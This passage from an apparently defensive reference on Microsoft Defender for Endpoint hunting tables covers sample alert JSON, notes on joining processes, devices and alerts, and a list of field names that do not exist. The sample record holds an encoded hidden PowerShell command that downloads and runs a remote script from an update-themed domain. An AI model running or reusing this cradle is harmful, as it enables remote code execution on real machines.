    "AccountUpn": "dana.levi@nexacorp.com",
    "DeviceId": "3f9a1c6e2b8d4f70a5e1c9b3d7f2a6e4c8b0d1f5",
    "DeviceName": "fin-ws-0142.nexacorp.local",
    "LocalIP": null,
    "NetworkMessageId": null,
    "EmailSubject": null,
    "Application": null,
    "ApplicationId": null,
    "OAuthApplicationId": null,
    "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
    "RegistryKey": null,
    "RegistryValueName": null,
    "RegistryValueData": null,
    "AdditionalFields": "{\"ProcessId\":\"7412\",\"CreationTimeUtc\":\"2026-09-29T08:14:22.4019871Z\",\"ImageFile\":{\"FileName\":\"powershell.exe\",\"FolderPath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\"}}",
    "Severity": "Medium",
    "MachineGroup": "Finance-Workstations"
  }
}
```

(The inner key set of `AdditionalFields` for a Process entity is **UNVERIFIED** beyond `ProcessId`, which the
Elastic raw sample shows; keep it minimal.)

---

## 5. Investigation notes

- **Actor vs target**: in every Device* table the `InitiatingProcess*` columns are the actor. In DeviceProcessEvents
  the *new* process is `FileName`/`ProcessId`/`ProcessCommandLine` and the creator is `InitiatingProcess*`; its parent
  is `InitiatingProcessParent*`. So one ProcessCreated row gives three generations (explorer → WINWORD → powershell).
- **Joining a process across tables**: `DeviceId` + `InitiatingProcessId` + `InitiatingProcessCreationTime` (PIDs are
  reused; the creation time disambiguates). Newer data also has `ProcessUniqueId` / `InitiatingProcessUniqueId`.
  A child's `InitiatingProcessId`+`InitiatingProcessCreationTime` = the parent row's `ProcessId`+`ProcessCreationTime`.
- **Hashes**: pivot on `SHA1` (always populated) — Microsoft states SHA256 is often empty.
- **Network**: `RemoteUrl` is filled when the connection can be tied to a hostname; pivot `RemoteIP` ↔ `DnsQueryResponse`
  results ↔ `AlertEvidence` `EntityType:"Ip"/"Url"`.
- **Alerts**: `AlertInfo` (one row per alert) ⋈ `AlertEvidence` (one row per entity) on `AlertId`. Evidence
  `EvidenceRole:"Impacted"` = assets hit (device/user/process), `"Related"` = artefacts (files, IPs, URLs).
- **Users**: `AccountSid` / `InitiatingProcessAccountSid` and `AccountObjectId` (Entra) are stable; `LogonId` links
  process activity to `DeviceLogonEvents` on the same device until reboot.
- **Console vocabulary**: Defender portal (security.microsoft.com) → Incidents & alerts → *Alert story / process tree*;
  Assets → Devices → *Device timeline*; Hunting → *Advanced hunting* (KQL); response actions *Isolate device*,
  *Collect investigation package*, *Live response*, *Stop and quarantine file*; AIR = *Automated investigation*.
  Incidents group alerts (Incident ID is numeric; it is not a column of AlertInfo).

---

## 6. Common mistakes / fields that do NOT exist

- Invented names: `mde.AlertTitle`, `AlertTitle`, `AlertName`, `ThreatName` (use AlertInfo `Title`, AlertEvidence
  `ThreatFamily`), `ComputerName`/`Hostname`/`MachineName` (use `DeviceName`), `CommandLine` (use
  `ProcessCommandLine` / `InitiatingProcessCommandLine`), `ParentProcessName` (use `InitiatingProcessParentFileName`),
  `DestinationIp`/`DstIp` (use `RemoteIP`), `Username` (use `AccountName` / `InitiatingProcessAccountName`),
  `ProcessName` (use `FileName`), `ImagePath` (use `FolderPath`), `EventID`.
- ActionType values that do NOT exist: `ProcessCreate`, `ProcessStart`, `NetworkConnection`, `FileWrite`,
  `DnsQuery` (the real ones are `ProcessCreated`, `ConnectionSuccess`, `FileCreated`/`FileModified`,
  `DnsQueryResponse`).
- `AdditionalFields` is a JSON **string**, not a nested object; `AttackTechniques` and `Categories` are JSON-array
  **strings**.
- `Severity` in AlertInfo is a capitalised word (`High`/`Medium`/`Low`/`Informational`), not a number.
- `FolderPath` in DeviceProcessEvents/DeviceFileEvents includes the file name; `InitiatingProcessFolderPath` is often
  lower-cased. AlertEvidence `FolderPath` is the directory (observed).
- Do not add Log Analytics columns (`TimeGenerated`, `TenantId`, `Type`, `SourceSystem`, `_ResourceId`) to a
  streamed record, and do not add Elastic/Wazuh wrappers (`m365_defender.*`, `data.*`, `@timestamp`).
- Do not mix Graph `alerts_v2` fields (`incidentId`, `providerAlertId`, `evidence[]` with `@odata.type`,
  `detectionSource:"microsoftDefenderForEndpoint"` camelCase enums) or legacy MDE API alert fields
  (`alertCreationTime`, `machineId`, `computerDnsName`, `threatFamilyName`) into AlertInfo/AlertEvidence.
- Legacy naming: the old "MDATP" schema (2018-2019) used `EventTime`, `MachineId`, `ComputerName`, `ProcessCreationEvents`,
  `NetworkCommunicationEvents`, `FileCreationEvents`, `InitiatingProcessParentName`. Current names are `Timestamp`,
  `DeviceId`, `DeviceName`, `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceFileEvents`,
  `InitiatingProcessParentFileName`. (Legacy names from community history — **UNVERIFIED** against a retrievable doc.)
